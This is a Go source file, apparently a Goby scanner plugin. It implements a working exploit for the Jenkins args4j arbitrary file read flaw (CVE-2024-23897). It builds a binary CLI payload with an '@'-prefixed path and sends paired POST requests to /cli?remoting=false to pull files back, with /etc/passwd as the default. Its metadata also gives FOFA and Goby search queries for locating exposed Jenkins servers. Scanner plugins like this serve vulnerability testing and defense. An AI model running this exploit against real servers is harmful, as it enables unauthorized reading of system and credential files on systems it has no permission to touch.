package exploits

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
	"sync"
	"time"
)

func init() {
	expJson := `{
    "Name": "Jenkins args4j file read vulnerability (CVE-2024-23897)",
    "Description": "<p>CloudBees Jenkins (formerly known as Hudson Labs) is a set of Java-based continuous integration tools developed by American CloudBees Company. It is mainly used to monitor continuous software version release/test projects and some regularly executed tasks.</p><p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely unsafe state.</p>",
    "Product": "Jenkins",
    "Homepage": "https://www.jenkins.io/",
    "DisclosureDate": "2024-01-24",
    "PostTime": "2024-01-26",
    "Author": "2737977997@qq.com",
    "FofaQuery": "header=\"X-Jenkins\" || banner=\"X-Jenkins\" || header=\"X-Hudson\" || banner=\"X-Hudson\" || header=\"X-Required-Permission: hudson.model.Hudson.Read\" || banner=\"X-Required-Permission: hudson.model.Hudson.Read\" || body=\"Jenkins-Agent-Protocols\"",
    "GobyQuery": "header=\"X-Jenkins\" || banner=\"X-Jenkins\" || header=\"X-Hudson\" || banner=\"X-Hudson\" || header=\"X-Required-Permission: hudson.model.Hudson.Read\" || banner=\"X-Required-Permission: hudson.model.Hudson.Read\" || body=\"Jenkins-Agent-Protocols\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely unsafe state.</p>",
    "Recommendation": "<p>1. Currently, the manufacturer has released an upgrade patch that has fixed this security issue. Please download it from the manufacturer’s homepage: <a href=\"https://jenkins.io/download\">https://jenkins.io/download</a></p><p>2. Set access policies through security devices such as firewalls and set whitelist access.</p><p>3. Unless necessary, it is prohibited to access the system from the public network.</p>",
    "References": [
        "https://github.com/advisories/GHSA-6f9g-cxwr-q5jr"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "custom",
            "show": ""
        },
        {
            "name": "filePath",
            "type": "input",
            "value": "/etc/passwd",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2024-23897"
    ],
    "CNNVD": [
        "CNNVD-202401-2204"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Jenkins args4j 文件读取漏洞（CVE-2024-23897）",
            "Product": "Jenkins",
            "Description": "<p>CloudBees Jenkins（前称Hudson Labs）是美国 CloudBees 公司的一套基于Java开发的持续集成工具，它主要用于监控持续的软件版本发布/测试项目和一些定时执行的任务。</p><p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。</p>",
            "Recommendation": "<p>1、目前厂商已经发布了升级补丁已修复这个安全问题，请到厂商的主页下载：<a href=\"https://jenkins.io/download\">https://jenkins.io/download</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Jenkins args4j file read vulnerability (CVE-2024-23897)",
            "Product": "Jenkins",
            "Description": "<p>CloudBees Jenkins (formerly known as Hudson Labs) is a set of Java-based continuous integration tools developed by American CloudBees Company. It is mainly used to monitor continuous software version release/test projects and some regularly executed tasks.</p><p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely unsafe state.</p>",
            "Recommendation": "<p>1. Currently, the manufacturer has released an upgrade patch that has fixed this security issue. Please download it from the manufacturer’s homepage: <a href=\"https://jenkins.io/download\">https://jenkins.io/download</a></p><p>2. Set access policies through security devices such as firewalls and set whitelist access.</p><p>3. Unless necessary, it is prohibited to access the system from the public network.</p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely unsafe state.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10912"
}`

	generateUUIDhjidashdhaujshd := func() (string, error) {
		uuid := make([]byte, 16)
		_, err := rand.Read(uuid)
		if err != nil {
			return "", err
		}
		uuid[6] = (uuid[6] & 0x0f) | 0x40 // Version 4
		uuid[8] = (uuid[8] & 0x3f) | 0x80 // Variant is 10
		return fmt.Sprintf("%x-%x-%x-%x-%x", uuid[0:4], uuid[4:6], uuid[6:8], uuid[8:10], uuid[10:]), nil
	}

	fileReadingjidashdhaujshd := func(hostInfo *httpclient.FixUrl, filePath string) (*httpclient.HttpResponse, error) {
		dataBytes := []byte{
			0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x08,
		}
		dataBytes = append(dataBytes, []byte("who-am-i")...)
		filePath = "@" + filePath
		// 写入文件长度 + 2filepath length + 2
		dataLengthBuf := make([]byte, 4)
		binary.BigEndian.PutUint32(dataLengthBuf, uint32(len(filePath)+2))
		dataBytes = append(dataBytes, dataLengthBuf...)
		dataLengthBuf = make([]byte, 2)
		// 写入文件长度
		binary.BigEndian.PutUint16(dataLengthBuf, uint16(len(filePath)))
		dataBytes = append(dataBytes, []byte{0x00}...)
		dataBytes = append(dataBytes, dataLengthBuf...)
		dataBytes = append(dataBytes, []byte(filePath)...)
		dataBytes = append(dataBytes, []byte{0x00, 0x00, 0x00, 0x07, 0x02, 0x00, 0x05}...)
		dataBytes = append(dataBytes, []byte("UTF-8")...)
		dataBytes = append(dataBytes, []byte{0x00, 0x00, 0x00, 0x07, 0x01, 0x00, 0x05}...)
		dataBytes = append(dataBytes, []byte("us_EN")...)
		dataBytes = append(dataBytes, []byte{0x00, 0x00, 0x00, 0x00, 0x03}...)
		uuid, _ := generateUUIDhjidashdhaujshd()
		var resp *httpclient.HttpResponse
		var err error
		var wg = &sync.WaitGroup{}
		go func() {
			wg.Add(1)
			threadRequestConfig := httpclient.NewPostRequestConfig("/cli?remoting=false")
			threadRequestConfig.Header.Store("Session", uuid)
			threadRequestConfig.Header.Store("Side", "download")
			threadRequestConfig.VerifyTls = false
			resp, err = httpclient.DoHttpRequest(hostInfo, threadRequestConfig)
			wg.Done()
		}()
		time.Sleep(time.Second * 3)
		requestConfig := httpclient.NewPostRequestConfig("/cli?remoting=false")
		requestConfig.Header.Store("Content-type", "application/octet-stream")
		requestConfig.Header.Store("Session", uuid)
		requestConfig.Header.Store("Side", "upload")
		requestConfig.VerifyTls = false
		requestConfig.Data = string(dataBytes)
		httpclient.DoHttpRequest(hostInfo, requestConfig)
		return resp, err
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, _ := fileReadingjidashdhaujshd(hostinfo, "/tmp/asdadadasdabdgadhkjsadhakdhklasdhsaldsashkdletc/xsx2ssxss")
			return resp != nil && strings.Contains(resp.Utf8Html, `No such file:`) && strings.Contains(resp.Utf8Html, `/tmp/asdadadasdabdgadhkjsadhakdhklasdhsaldsashkdletc/xsx2ssxss`)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "custom" {
				if resp, err := fileReadingjidashdhaujshd(expResult.HostInfo, goutils.B2S(ss.Params["filePath"])); resp != nil && resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else {
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
